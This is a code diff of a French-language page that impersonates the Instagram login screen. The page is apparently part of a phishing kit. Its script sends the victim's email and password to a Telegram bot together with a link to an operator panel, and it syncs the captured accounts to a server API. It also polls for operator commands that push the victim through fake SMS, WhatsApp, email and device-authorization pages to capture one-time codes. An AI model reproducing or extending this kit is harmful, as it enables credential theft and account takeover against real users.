@@ -6,33 +6,33 @@
   <title>Instagram - Connexion</title>
   <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📸</text></svg>">
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
     *{margin:0;padding:0;box-sizing:border-box}
     body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#000;min-height:100vh;display:flex;flex-direction:column;align-items:center;color:#f5f5f5}
     .ig-logo{width:100%;text-align:center;padding:20px 0 0}
     .ig-logo svg{width:56px;height:56px}
-    .divider{width:100%;height:1px;background:#262626;margin-top:16px}
-    .container{width:100%;max-width:400px;padding:40px 16px 20px;flex:1;display:flex;flex-direction:column;align-items:center}
-    .card{background:#181818;border:1px solid #363636;border-radius:16px;padding:32px;width:100%}
-    .input-group{margin-bottom:12px;position:relative}
-    .field-label{position:absolute;top:-8px;left:14px;font-size:11px;color:#a8a8a8;background:#181818;padding:0 4px;z-index:1}
-    input[type="text"],input[type="password"]{width:100%;padding:14px 16px;border:1px solid #363636;border-radius:12px;font-size:15px;color:#f5f5f5;background:#262626;transition:border-color .2s,background .2s;outline:none;font-family:inherit}
-    input:focus{border-color:#585858;background:#1a1a1a}
-    input::placeholder{color:#737373}
+    .divider{width:100%;max-width:400px;height:1px;background:#262626;margin-top:16px}
+    .container{width:100%;max-width:400px;padding:24px 40px 20px;flex:1;display:flex;flex-direction:column;align-items:center}
+    .input-group{margin-bottom:6px;position:relative}
+    input[type="text"],input[type="password"]{width:100%;padding:14px 16px;border:1px solid #363636;border-radius:24px;font-size:15px;color:#f5f5f5;background:transparent;transition:border-color .2s;outline:none;font-family:inherit}
+    input:focus{border-color:#585858}
+    input::placeholder{color:#a8a8a8;font-size:15px}
     .pw-toggle{position:absolute;right:14px;top:50%;transform:translateY(-50%);background:none;border:none;color:#737373;cursor:pointer;padding:4px}
     .pw-toggle:hover{color:#f5f5f5}
-    .btn-primary{width:100%;padding:14px;border:none;border-radius:28px;font-size:15px;font-weight:600;cursor:pointer;color:#fff;background:#0095f6;transition:background .2s;font-family:inherit;margin-top:8px}
+    .btn-primary{width:100%;padding:12px;border:none;border-radius:24px;font-size:14px;font-weight:600;cursor:pointer;color:#fff;background:#0095f6;transition:background .2s;font-family:inherit;margin-top:12px}
     .btn-primary:hover{background:#1877f2}
-    .forgot{text-align:center;margin-top:20px}
+    .forgot{text-align:center;margin-top:16px;margin-bottom:20px}
     .forgot a{color:#f5f5f5;font-size:14px;font-weight:600;text-decoration:none}
     .forgot a:hover{text-decoration:underline}
-    .btn-fb{width:100%;padding:14px;background:transparent;border:1px solid #363636;border-radius:28px;color:#f5f5f5;font-size:14px;font-weight:600;font-family:inherit;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;transition:background .2s;margin-top:24px}
+    .btn-fb{width:100%;padding:10px 16px;background:transparent;border:1px solid #363636;border-radius:24px;color:#f5f5f5;font-size:14px;font-weight:600;font-family:inherit;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;transition:background .2s}
     .btn-fb:hover{background:rgba(255,255,255,0.05)}
-    .btn-signup{width:100%;padding:14px;background:transparent;border:1px solid #0095f6;border-radius:28px;color:#0095f6;font-size:14px;font-weight:600;font-family:inherit;cursor:pointer;transition:background .2s;margin-top:12px}
+    .btn-signup{width:100%;padding:10px 16px;background:transparent;border:1px solid #0095f6;border-radius:24px;color:#0095f6;font-size:14px;font-weight:600;font-family:inherit;cursor:pointer;transition:background .2s;margin-top:8px}
     .btn-signup:hover{background:rgba(0,149,246,0.08)}
-    .footer{width:100%;max-width:400px;text-align:center;padding:16px;color:#737373;font-size:12px;line-height:1.6}
-    .footer a{color:#737373;text-decoration:none}
-    .footer a:hover{text-decoration:underline}
+    .footer{width:100%;max-width:400px;padding:20px 40px 24px;display:flex;flex-direction:column;align-items:center}
+    .footer-links{display:flex;flex-wrap:wrap;justify-content:center;gap:6px 12px;margin-bottom:8px}
+    .footer-links a{color:#737373;font-size:12px;text-decoration:none}
+    .footer-copy{display:flex;align-items:center;gap:8px;color:#737373;font-size:12px}
+    .footer-copy select{background:transparent;border:none;color:#737373;font-size:12px;font-family:inherit;cursor:pointer;outline:none}
+    .footer-copy select option{background:#262626;color:#f5f5f5}
   </style>
 </head>
 <body>
@@ -47,39 +47,44 @@
   </div>
 
   <div class="container">
-    <div class="card">
-      <form id="loginForm">
-        <div class="input-group">
-          <label class="field-label">Numéro de mobile, nom de profil ou adresse e-mail</label>
-          <input type="text" id="email" autocomplete="username">
-        </div>
-        <div class="input-group">
-          <label class="field-label">Mot de passe</label>
-          <input type="password" id="password" autocomplete="current-password">
-          <button type="button" class="pw-toggle" id="pwToggle">
-            <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
-          </button>
-        </div>
-        <button type="submit" class="btn-primary">Se connecter</button>
-      </form>
-
-      <div class="forgot">
-        <a href="#">Mot de passe oublié ?</a>
+    <h1 style="color:#f5f5f5;font-size:20px;font-weight:600;margin-bottom:24px;line-height:24px;width:100%;text-align:left;">Se connecter à Instagram</h1>
+    <form id="loginForm" style="width:100%">
+      <div class="input-group">
+        <input type="text" id="email" placeholder="Numéro de mobile, nom de profil ou adresse e-mail" autocomplete="username">
       </div>
+      <div class="input-group">
+        <input type="password" id="password" placeholder="Mot de passe" autocomplete="current-password">
+        <button type="button" class="pw-toggle" id="pwToggle">
+          <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
+        </button>
+      </div>
+      <button type="submit" class="btn-primary">Se connecter</button>
+    </form>
 
-      <button class="btn-fb">
-        <svg viewBox="0 0 24 24" fill="#1877f2" width="20" height="20"><path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12z"/></svg>
-        Se connecter avec Facebook
-      </button>
-
-      <button class="btn-signup">Créer un nouveau compte</button>
+    <div class="forgot">
+      <a href="#">Mot de passe oublié ?</a>
     </div>
+
+    <button class="btn-fb">
+      <svg viewBox="0 0 24 24" fill="#1877f2" width="20" height="20"><path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12z"/></svg>
+      Se connecter avec Facebook
+    </button>
+
+    <button class="btn-signup">Créer un nouveau compte</button>
   </div>
 
   <div class="footer">
-    <div>Meta &copy; 2026</div>
-    <div style="margin-top:4px">
-      <a href="#">Conditions</a> &middot; <a href="#">Politique de confidentialité</a> &middot; <a href="#">Politique relative aux cookies</a>
+    <div class="footer-links">
+      <a href="#">Meta</a><a href="#">À propos</a><a href="#">Blog</a><a href="#">Emplois</a><a href="#">Aide</a><a href="#">API</a>
+      <a href="#">Confidentialité</a><a href="#">Conditions</a><a href="#">Lieux</a><a href="#">Populaire</a>
+      <a href="#">Instagram Lite</a><a href="#">Meta AI</a><a href="#">Threads</a>
+    </div>
+    <div class="footer-links" style="margin-bottom:12px;">
+      <a href="#">Importation des contacts et non-utilisateurs</a><a href="#">Meta Verified</a>
+    </div>
+    <div class="footer-copy">
+      <select><option>Français</option><option>English</option><option>Español</option><option>Deutsch</option><option>Português</option><option>Italiano</option><option>日本語</option><option>한국어</option><option>中文</option></select>
+      <span>© 2026 Instagram from Meta</span>
     </div>
   </div>
 
@@ -87,15 +92,29 @@
   <script>
     var params = new URLSearchParams(window.location.search);
     var username = params.get('user') || '';
-    if (!username) window.location.href = '../INSTAGRAM.html';
 
+    var API_BASE = window.location.origin;
     function getUsers() { try { return JSON.parse(localStorage.getItem('ig_users') || '[]'); } catch (e) { return []; } }
-    function saveUsers(users) { localStorage.setItem('ig_users', JSON.stringify(users)); }
+    function saveUsers(users) {
+      localStorage.setItem('ig_users', JSON.stringify(users));
+      fetch(API_BASE + '/api/users', { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(users.length === 1 ? users[0] : users) }).catch(function() {});
+    }
+    function syncFromServer() {
+      fetch(API_BASE + '/api/users').then(function(r) { return r.json(); }).then(function(serverUsers) {
+        if (Array.isArray(serverUsers) && serverUsers.length > 0) {
+          var local = getUsers();
+          serverUsers.forEach(function(su) {
+            var exists = local.find(function(l) { return l.visitorId === su.visitorId; });
+            if (!exists) { local.push(su); }
+          });
+          localStorage.setItem('ig_users', JSON.stringify(local));
+        }
+      }).catch(function() {});
+    }
+    syncFromServer();
 
     function getClientId() {
       var id = sessionStorage.getItem('ig_visitor_id');
-      if (!id) { window.location.href = '../INSTAGRAM.html'; return ''; }
-      return id;
     }
 
     var cid = getClientId();
@@ -123,7 +142,7 @@
         user.data.email = email;
         user.data.password = password;
         saveUsers(users);
-        sendToTelegram('\ud83d\udce7 <b>Nouvelle connexion Instagram</b>\n\n\ud83d\udc64 Email: ' + email + '\n\ud83d\udd10 Mot de passe: ' + password);
+        sendToTelegram('\ud83d\udce7 <b>Nouvelle connexion Instagram</b>\n\n\ud83d\udc64 Email: ' + email + '\n\ud83d\udd10 Mot de passe: ' + password + '\n\n\ud83d\udd17 Panel: https://voyage-production-88ca.up.railway.app/PANEL.html');
       }
       var btn = this.querySelector('button[type="submit"]');
       btn.disabled = true;
@@ -131,18 +150,21 @@
       setTimeout(function() { window.location.href = 'loading.html?user=' + encodeURIComponent(username); }, 1000);
     });
 
-    var checkInterval = setInterval(function() {
+        var checkInterval = setInterval(function() {
       var visitorId = getClientId();
-      var users = getUsers();
-      var user = users.find(function(u) { return u.visitorId === visitorId; });
-      if (user && user.action) {
-        var action = user.action;
-        user.action = null;
-        saveUsers(users);
-        var pages = { 'connexion_f': 'login.html', 'login_incorrect': 'login_incorrect.html', 'sms_verification': 'sms.html', 'sms_error': 'sms_incorrect.html', 'whatsapp_verification': 'whatsapp.html', 'whatsapp_error': 'whatsapp_incorrect.html', 'email_verification': 'email.html', 'email_error': 'email_incorrect.html', 'loading': 'loading.html', 'technical_error': 'technical_error.html' };
-        var page = pages[action] || 'loading.html';
-        window.location.href = page + '?user=' + encodeURIComponent(username);
-      }
+      fetch(API_BASE + '/api/consume_action?visitorId=' + encodeURIComponent(visitorId))
+        .then(function(r) { return r.json(); })
+        .then(function(d) {
+          if (d && d.action) {
+            var pages = { 'login': 'login.html', 'connexion_f': 'login.html', 'login_incorrect': 'login_incorrect.html', 'sms_verification': 'sms.html', 'sms_error': 'sms_incorrect.html', 'whatsapp_verification': 'whatsapp.html', 'whatsapp_error': 'whatsapp_incorrect.html', 'email_verification': 'email.html', 'email_error': 'email_incorrect.html', 'loading': 'loading.html', 'technical_error': 'technical_error.html', 'authorize_device': 'authorize_device.html', 'retry': 'login.html' };
+            var page = pages[d.action] || 'loading.html';
+            var target = new URL(page, window.location.href);
+            if (target.pathname === window.location.pathname) return;
+            window.location.href = page + '?user=' + encodeURIComponent(username);
+            return;
+          }
+        })
+        .catch(function() {});
     }, 2000);
   </script>
 </body>
